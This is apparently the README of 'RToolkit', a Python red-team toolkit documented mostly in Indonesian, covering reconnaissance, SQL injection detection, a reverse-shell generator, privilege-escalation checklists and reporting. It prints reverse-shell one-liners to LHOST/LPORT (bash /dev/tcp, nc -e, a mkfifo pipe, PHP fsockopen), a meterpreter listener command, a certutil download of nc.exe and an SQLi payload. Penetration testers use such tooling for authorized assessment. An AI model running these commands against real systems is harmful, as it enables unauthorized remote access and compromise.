# RToolkit v2.0 - Unified Red Team Toolkit

🔥 Gabungan 150+ tools red team dari [RedTeam-Tools](https://github.com/A-poc/RedTeam-Tools) menjadi **1 script Python** dengan 5 fase utama.

## Fitur Utama

| Fase | Deskripsi |
|------|-----------|
| **🔍 Reconnaissance & Mapping** | DNS lookup, subdomain enum (200+ wordlist), port scanning (100+ ports), certificate transparency (crt.sh), deep directory bruteforce (300+ paths), technology/version detection, cascading scan on subdomains |
| **🛡️ Vulnerability Analysis** | Parameter discovery, SQL injection detection (error-based + time-based), common web vulns (.env, .git, phpinfo), SSL/TLS check, security headers audit, CORS misconfig |
| **💥 Exploitation** | Reverse shell generator (11 jenis: bash, python, nc, powershell, php, perl, ruby, nc_pipe, java, lua, golang), msfvenom commands, default cred checker |
| **🔧 Post-Exploitation & PrivEsc** | Windows & Linux privesc checklist, sensitive file finder, enumeration commands, kernel exploit suggestions |
| **📄 Reporting** | HTML report interaktif, JSON report, severity summary, remediations, CVSS scoring |

---

## Instalasi

### Kali Linux / Debian (externally-managed-environment)
```bash
# Opsi 1: Virtual Environment (REKOMENDASI)
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Opsi 2: pipx
sudo apt install pipx && pipx ensurepath
pipx install -r requirements.txt

# Opsi 3: Override (tidak direkomendasikan)
pip install --break-system-packages -r requirements.txt
```

### Windows / Lainnya
```bash
pip install -r requirements.txt
```

### Dependencies (requirements.txt)
```txt
requests
colorama
urllib3
```

---

## Cara Penggunaan

### 1. RToolkit (Main Toolkit)
```bash
python rtoolkit.py
```
Masukkan target (domain/IP/URL), lalu pilih menu:
```
1  - Reconnaissance & Mapping (Full Recon)
2  - Vulnerability Analysis (Vuln Scan + SQLi)
3  - Exploitation (Reverse Shells + Payloads)
4  - Post-Exploitation & PrivEsc (Checklist)
5  - Generate Report (HTML + JSON)
6  - Run All (Full Pipeline 1-5)
```

**Contoh interaktif:**
```
Target: https://example.com
Pilih [1-6]: 6
```

---

### 2. gen_cve.py (CVE Database Generator)
Script untuk generate `cve_data.json` yang dipakai RToolkit untuk CVE mapping.

```bash
python gen_cve.py
```
Output: `cve_data.json` (sudah included di repo)

**CVE Database Coverage:**
| Software | Versi Coverage | CVE Count |
|----------|---------------|-----------|
| Apache | 2.0.x - 2.4.x | 20+ |
| Nginx | 0.8.x - 1.25.x | 15+ |
| PHP | 5.3.x - 8.3.x | 40+ |
| WordPress | 2.3 - 6.4.x | 150+ |
| Joomla | 3.8 - 5.0 | 30+ |
| MySQL | 5.5 - 8.0 | 25+ |
| OpenSSL | 1.0.2 - 3.2 | 50+ |

---

## Tools yang Diintegrasikan (Mapping ke RedTeam-Tools)

| Kategori | Tools Referensi | Implementasi di RToolkit |
|----------|----------------|-------------------------|
| **Recon** | spiderfoot, reconftw, subzy, crt.sh, gobuster, feroxbuster, dnsrecon, shodan, AORT, skanuvaty, gowitness | **Built-in**: DNS lookup, cert transparency (crt.sh), subdomain enum (200+ wordlist), port scanner (100+ ports), deep dir bruteforce (300+ paths), tech detection |
| **Vuln Scan** | nuclei, spoofcheck, Dismap | **Built-in**: SQLi detection (error+time based), common vuln checks (.env, .git, phpinfo, wp-json), SSL/TLS, security headers, CORS |
| **Exploit** | msfvenom, hydra, responder | **Built-in**: 11 reverse shell types, msfvenom listener commands |
| **Post-Exploit** | mimikatz, PEASS, Sherlock, Watson, BeRoot, PowerSploit | **Built-in**: Win/Linux privesc checklist, enum commands, kernel exploit suggestions |
| **C2/Exfil** | empire, hoaxshell, dnscat2, cloakify | **Reference**: Listener commands untuk C2 frameworks |

---

## Detail Fitur per Fase

### 1. Reconnaissance & Mapping (`run_recon()`)
- **DNS Lookup**: A, AAAA, MX, NS, TXT, CNAME
- **Certificate Transparency**: Query crt.sh untuk subdomain discovery
- **Subdomain Enum**: 200+ wordlist (www, mail, admin, api, dev, staging, dll)
- **Cascading Scan**: Auto-scan setiap subdomain yang ditemukan (port + tech)
- **Port Scanner**: 100+ common ports (TCP connect, threaded 50 workers)
- **Deep Directory Bruteforce**: 300+ paths, 2 level depth, recursive
- **Technology Detection**: Server, PHP, CMS (WP/Joomla/Drupal), JS frameworks, CDN, cookies, headers
- **CVE Mapping**: Auto-match version ke database CVE lokal
- **WP Plugin/Theme Enum**: Deteksi plugin & theme dari HTML
- **Security Headers**: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, dll

### 2. Vulnerability Analysis (`run_vuln_scan()`)
- **Parameter Discovery**: Extract dari forms, URLs, query strings (80+ common params)
- **SQL Injection Detection**:
  - Error-based: MySQL, MSSQL, Oracle, PostgreSQL, SQLite patterns
  - Time-based: SLEEP, WAITFOR DELAY, pg_sleep (threshold 2.5s)
  - Test 10 param pertama, 5 payload per type
- **Common Vuln Checks**: .env, .git/config, .git/HEAD, phpinfo, wp-debug, backup, crossdomain.xml, server-status
- **SSL/TLS Check**: Protocol version (TLSv1.0/1.1 = HIGH), cipher info
- **Security Headers Audit**: Missing HSTS, CSP, X-Content-Type-Options, X-Frame-Options

### 3. Exploitation (`run_exploit()`)
**Reverse Shell Generator (11 types):**
| Type | Command Preview |
|------|----------------|
| bash | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| python | `python3 -c 'import socket,subprocess,os;...'` |
| nc | `nc -e /bin/sh LHOST LPORT` |
| powershell | `powershell -NoP -NonI -W Hidden -Exec Bypass ...` |
| php | `php -r '$sock=fsockopen("LHOST",LPORT);exec(...)` |
| perl | `perl -e 'use Socket;...'` |
| ruby | `ruby -rsocket -e 'c=TCPSocket.new(...)` |
| nc_pipe | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh...` |
| java | `Runtime.getRuntime().exec("/bin/bash -c ...")` |
| lua | `lua -e "local s=require('socket')..."` |
| golang | `go run -exec '...' ` |

**Metasploit Listener:**
```bash
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'
```

### 4. Post-Exploitation & PrivEsc (`run_postexploit()`)
**Windows:**
- Unquoted Service Paths, AlwaysInstallElevated, Scheduled Tasks, Startup Programs, Registry Autologon, SAM Backup, Stored Credentials, Token Impersonation, Named Pipes, DLL Hijacking, Weak Service Permissions

**Linux:**
- SUID/SGID, Sudo -l, Capabilities, Cron Jobs, PATH Hijacking, NFS Root Squash, Docker Socket, Kernel Exploits (DirtyCow, DirtyPipe, PwnKit), Container Escape

**Commands:**
```bash
# Windows
wmic service get name,pathname | findstr /i '"'
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
schtasks /query /fo LIST /v
whoami /priv
certutil -urlcache -f http://LHOST/nc.exe nc.exe

# Linux
find / -perm -4000 2>/dev/null
sudo -l
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /var/www/html/
```

### 5. Reporting (`generate_report()`)
- **HTML Report**: Interactive dengan accordion, severity badges, color-coded tables
- **JSON Report**: Machine-readable untuk integrasi SIEM/CI/CD
- **Summary**: Total vulns, Critical/High/Medium/Low count, CVSS scoring
- **Remediation**: Auto-generated per finding

---

## Output Files

Setelah run report (menu 5 atau 6):
```
reports/
├── rtoolkit_report_<target>_<timestamp>.html
└── rtoolkit_report_<target>_<timestamp>.json
```

---

## Contoh Output (Console)

```
╔══════════════════════════════════════════════════════════════╗
║  ██████╗ ████████╗ ██████╗  ██████╗ ██╗  ██╗██╗     ██╗████████╗ ║
║  v2.0 - Deep Recon | SQLi | Dir Buster | CVE Mapping | Cascade ║
╚══════════════════════════════════════════════════════════════╝

[+] DNS Lookup
    A: 93.184.216.34

[+] Certificate Transparency (crt.sh)
    Found 12 domains
    - example.com
    - www.example.com
    - api.example.com
    ...

[+] Subdomain Enumeration
    Found 5 live subdomains:
    ┌─────────────────────┬──────────────────┐
    │ Subdomain           │ IP               │
    ├─────────────────────┼──────────────────┤
    │ www.example.com     │ 93.184.216.34    │
    │ api.example.com     │ 93.184.216.35    │
    └─────────────────────┴──────────────────┘

[+] Technology & Version Detection
    ┌─────────────────┬────────────────────────────┐
    │ Technology      │ Version/Detail             │
    ├─────────────────┼────────────────────────────┤
    │ Server          │ nginx/1.18.0               │
    │ PHP_version     │ 7.4.33                     │
    │ CMS             │ WordPress                  │
    │ WordPress_version│ 6.4.2                     │
    └─────────────────┴────────────────────────────┘

    🔴 Found 3 relevant CVEs:
    ┌────────────┬──────────┬──────────────────────────────┬──────────┐
    │ Software   │ Version  │ CVE                          │ Severity │
    ├────────────┼──────────┼──────────────────────────────┼──────────┤
    │ Nginx      │ 1.18.0   │ CVE-2020-11724 (HTTP/2 DoS)  │ HIGH     │
    │ PHP        │ 7.4.33   │ CVE-2022-31628 (phar deserial)│ HIGH     │
    │ WordPress  │ 6.4.2    │ CVE-2023-6961 (Comment leak) │ MEDIUM   │
    └────────────┴──────────┴──────────────────────────────┴──────────┘

[+] SQL Injection Detection
    Testing 15 parameters...
    ┌─────────────────────┬────────┬────────────────────┬──────────┐
    │ Type                │ Param  │ Payload            │ Severity │
    ├─────────────────────┼────────┼────────────────────┼──────────┤
    │ Error-Based (MySQL) │ id     │ ' OR '1'='1        │ CRITICAL │
    └─────────────────────┴────────┴────────────────────┴──────────┘
```

---

## Disclaimer

> **⚠️ FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY**
> 
> Penggunaan tool ini harus dengan izin tertulis dari pemilik sistem/target. Penyalahgunaan untuk aktivitas ilegal adalah tanggung jawab pengguna. Author tidak bertanggung jawab atas misuse.

---

## Credit & References

- Original tools collection: [A-poc/RedTeam-Tools](https://github.com/A-poc/RedTeam-Tools) (150+ tools)
- CVE Data: NVD, MITRE, vendor advisories
- Wordlists: SecLists, fuzzdb, AssetNote
- Inspiration: nuclei, gobuster, feroxbuster, sqlmap, PEASS

---

## License

MIT License - See LICENSE file for details.